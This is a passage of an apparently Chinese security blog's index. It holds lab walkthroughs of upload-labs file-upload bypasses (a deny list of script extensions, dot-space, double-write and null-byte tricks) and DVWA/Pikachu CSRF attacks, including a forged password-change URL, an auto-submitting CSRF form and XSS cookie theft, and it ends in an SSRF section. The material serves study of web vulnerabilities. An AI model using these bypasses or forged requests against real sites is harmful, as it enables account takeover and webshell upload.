string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这里其实已经过滤的很严格了。</p><p>依次进行了严格的黑名单过滤、转换大小写、去除文件名尾的空格和点。还去除了;$DATA.</p><p>但是这里存在很明显的代码逻辑漏洞：代码<strong>去点，除空</strong>的操作只进行了一次。那么我们把后缀名改为</p><p><strong>php. .</strong> 点 空格点的格式。最后的后缀名为<strong>.php.</strong> 成功绕过。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115204443.png" alt=""></p><h5 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h5><p>考察知识点:双写绕过，这里利用了<code>str_irepalce</code>函数将不符合上传的后缀名替换为空，且该函数对 大小写不敏感，我们可以通过双写后缀名 .pphphp进行绕过。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115205208.png" alt=""></p><h5 id="Pass-11-get-00截断"><a href="#Pass-11-get-00截断" class="headerlink" title="Pass-11 get 00截断"></a>Pass-11 get 00截断</h5><p>考察知识点：00截断</p><img src="QQ截图20200124131542.png" style="zoom:50%;" /><p><strong>Pass-12 Post 00截断</strong></p><p>考察知识点：00截断</p><p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128202954.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128203026.png" alt=""></p><h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>考察知识点：图片马，结合文件包含</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115211730.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115211949.png" alt=""></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>命令执行/代码执行漏洞学习</title>
      <link href="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/"/>
      <url>/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化漏洞学习</title>
      <link href="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/"/>
      <url>/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞学习</title>
      <link href="/2020/04/03/xss-lou-dong-xue-xi/"/>
      <url>/2020/04/03/xss-lou-dong-xue-xi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF+SSRF漏洞学习</title>
      <link href="/2020/04/03/csrf-ssrf-lou-dong-xue-xi/"/>
      <url>/2020/04/03/csrf-ssrf-lou-dong-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="CSRF漏洞-SSRF漏洞笔记-靶场实战"><a href="#CSRF漏洞-SSRF漏洞笔记-靶场实战" class="headerlink" title="CSRF漏洞+SSRF漏洞笔记+靶场实战"></a>CSRF漏洞+SSRF漏洞笔记+靶场实战</h2><p>[TOC]</p><h3 id="CSRF漏洞部分"><a href="#CSRF漏洞部分" class="headerlink" title="CSRF漏洞部分"></a>CSRF漏洞部分</h3><h4 id="CSRF简述"><a href="#CSRF简述" class="headerlink" title="CSRF简述"></a>CSRF简述</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>CSRF攻击建立在浏览器和Web服务器的对话之中，并且能欺骗用户访问url，发起的目标是通过伪造的用户请求，该请求不是用户想发出去的请求，对服务器或服务来说，该请求是完全合法的请求，但却完成了攻击者的期望操作。</p><p>从代码上看，CSRF能攻击成功是攻击者猜到了你重要参数，因而伪造请求。</p><h5 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h5><p>1.攻击者必须在目标站点找到一个表单的提交入口，或者有类似的URL(例如用来转钱，修改受害者邮箱或者密码)</p><p>2.目标站点不能有检测referer头操作，或者被攻击者的浏览器允许referer欺骗</p><p>3.攻击者必须了解表单或者URL参数中的正确的值，如果有秘密验证值或者ID，攻击者没有猜对，攻击者很可能不成功。</p><p>4。攻击者必须诱使受害者访问有恶意代码的页面，并且此时受害者已经登录到目标站点。</p><h5 id="漏洞利用场景"><a href="#漏洞利用场景" class="headerlink" title="漏洞利用场景"></a>漏洞利用场景</h5><ul><li>有意义的操作（如修改密码）</li><li>验证过于简单（参数固定、我们可以设置参数）</li></ul><p><strong>漏洞类型</strong></p><ul><li>GET型</li><li>POST型</li></ul><h5 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h5><p>1.手工检测：抓包查看是否存在无token无referer验证这种情况。存在的话就会有CSRF漏洞</p><p>​                       如果存在无token有referer验证这种情况时，我们可以尝试空referer绕过或者尝试抓包伪造referer  </p><p>2.半自动检测：常用半自动检测漏洞的软件有CSRFTester,CSRF Request Builder等。</p><h5 id="常见的防御方法："><a href="#常见的防御方法：" class="headerlink" title="常见的防御方法："></a>常见的防御方法：</h5><ul><li><p><strong>使用验证码：</strong></p><p>验证码强制用户必须和应用进行交互，才能完成最终的请求</p></li><li><p><strong>验证HTTP referer字段：</strong></p><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。</p></li><li><p><strong>在请求地址中添加token并验证：</strong></p><p>在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token不正确，则认为可能是CSRF攻击而拒绝该请求。</p></li></ul><h4 id="DVWA（CSRF部分）"><a href="#DVWA（CSRF部分）" class="headerlink" title="DVWA（CSRF部分）"></a>DVWA（CSRF部分）</h4><h5 id="simple"><a href="#simple" class="headerlink" title="simple:"></a>simple:</h5><img src="QQ截图20200123184231.png" style="zoom:50%;" /><p><strong>分析：</strong></p><p>​      我们分析源代码可知，服务器收到修改密码的请求后，会检查参数password_new password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制，所以我们只需要用户在cookie还有效的时间内在相同的浏览器访问我们给定的url（该操作是服务器对请求的发送者进行了身份验证，检查cookie），就可以实现CSRF攻击，修改用户密码。</p><p><strong>漏洞利用</strong></p><p>我们可以构造如下URL进行修改密码：</p><p><a href="http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#" target="_blank" rel="noopener">http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#</a></p><p>我们构造一个html表单提交页面</p><img src="QQ截图20200128112112.png" style="zoom:67%;" /><p>将html文件放入本地网站的根目录下。</p><p>我们尝试在本地访问该网页</p><img src="QQ截图20200128112036.png" style="zoom:50%;" /><p>点击后发现跳转到了DVWA更改密码界面，密码被修改</p><img src="QQ截图20200128112051.png" style="zoom:67%;" /><h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Checks to see where the request came from</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Get input</span>        <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Do the passwords match?</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// They do!</span>            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Update the database</span>            <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> <span class="token punctuation">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"';"</span><span class="token punctuation">;</span>            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Feedback for the user</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Password Changed.&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Issue with passwords matching</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Passwords did not match.&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Didn't come from a trusted source</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>That request didn't look correct.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p><strong>分析：</strong></p><p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.153.130），希望通过这种机制抵御CSRF攻击</p><p><strong>漏洞利用：</strong></p><p>我们用burp对数据进行抓包，不断对referer进行修改，最后发现referer需包含我们host名</p><img src="QQ截图20200128112923.png" style="zoom: 67%;" /><p>查阅资料了解到referer参数和链接相同，我们可以将Html文件名中包含127.0.0.1,比如将html文件修改为</p><p>127.0.0.1.html</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128113629.png" alt=""></p><p>我们在浏览器打开127.0.0.1.html，点击submit</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128113414.png" alt=""></p><p>我们发现密码成功修改。</p><p><strong>high</strong></p><p>high等级我们发现在url中多了user_token,并且每次修改密码user_token都随着变化</p><p>usr_token的职责：它的职责是保护用户的用户名及密码多次提交，以防密码泄露。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128114230.png" alt=""></p><p>如果该页面不存在XSS漏洞时，此方法就可以有效杜绝CSRF漏洞</p><p>但我们可以通过利用DVWA的XSS漏洞进行有效利用</p><p><strong>利用过程</strong></p><p>我们首先利用dvwa的XSS漏洞获取浏览器cookie.</p><img src="QQ截图20200128114910.png" style="zoom:50%;" /><p>然后我们回到构造好的CSRF页面提交用Burp进行抓包</p><img src="QQ截图20200128115317.png" style="zoom:67%;" /><p>我们使用获取到的cookie进行替换，然后发包即可成功修改密码。</p><p><strong>impossibe</strong></p><img src="QQ截图20200128120628.png" style="zoom:50%;" /><p>它提示了要输入原始密码，这就保证了当前用户一定是本人，有效的确保了CSRF攻击。</p><h4 id="Pikachu平台-CSRF部分）"><a href="#Pikachu平台-CSRF部分）" class="headerlink" title="Pikachu平台(CSRF部分）"></a>Pikachu平台(CSRF部分）</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200129173327.png" alt=""></p><h5 id="CSRF-GET"><a href="#CSRF-GET" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h5><p>我们首先根据右上角的提示登录账号</p><img src="QQ截图20200129173354.png" style="zoom:50%;" /><img src="QQ截图20200129173746.png" style="zoom:67%;" /><p>我们选择修改个人信息并用burp抓包</p><img src="QQ截图20200129173928.png" style="zoom:80%;" /><p>提交的请求来看，后台没做CSRF token，同时也是通过GET请求来提交修改信息，我们拿到这个请求，伪造一个请求链接，然后让kobe点击就好，我们构造的URL中把地址add改为hack。kobe一点击就修改了地址。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200129174206.png" alt=""></p><h5 id="CSRF-POST"><a href="#CSRF-POST" class="headerlink" title="CSRF(POST)"></a>CSRF(POST)</h5><p>POST型，所有参数在请求体中提交，我们不能通过伪造URL的方式进行攻击。</p><p>这里的攻击方式跟XSS中POST类型是一样的，攻击者可以搭建一个站点，在站点上做一个表单，诱导lucy点击这个链接，当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息。</p><p>我们编写一个自动提交表单的html文件：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">window<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"postsubmit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.171.133/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>girl<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>12345678922<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hacker<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lucy@pikachu.com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>postsubmit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>​      下面把页面的URL发送给受害者，只要受害者一点击这个链接，就会自动往服务器发送POST请求，修改地址信息。</p><h5 id="CSRF（token"><a href="#CSRF（token" class="headerlink" title="CSRF（token)"></a>CSRF（token)</h5><p> CSRF的主要问题是敏感操作容易被伪造，我们可以加入Token让请求不容易被伪造</p><ul><li><p>每次请求，都增加一个随机码(需要够随机，不容易被伪造），后台每次对这个随机码进行验证</p><p>我们进入Pikachu平台的CSRF（token）页面并登录，我们可以看一下这个GET请求</p></li></ul><p><img src="QQ%E6%88%AA%E5%9B%BE20200203172940.png" alt=""></p><p>跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了</p><h3 id="SSRF漏洞部分"><a href="#SSRF漏洞部分" class="headerlink" title="SSRF漏洞部分"></a>SSRF漏洞部分</h3><h4 id="SSRF简述"><a href="#SSRF简述" class="headerlink" title="SSRF简述"></a>SSRF简述</h4><p><img src="20181227082125119.png" alt=""></p><p>​    SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><h5 id="漏洞形成原因"><a href="#漏洞形成原因" class="headerlink" title="漏洞形成原因"></a>漏洞形成原因</h5><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>例如：</p><p><code>www.xxx.com/a.php?image=http://www.abc.com/1.jpg</code></p><p>如果我们将<a href="http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a></p><p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p><p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现这个请求是否合法，然后服务器以他的身份来访问其他服务器的资源。</p><p><strong>curl造成的SSRF</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token 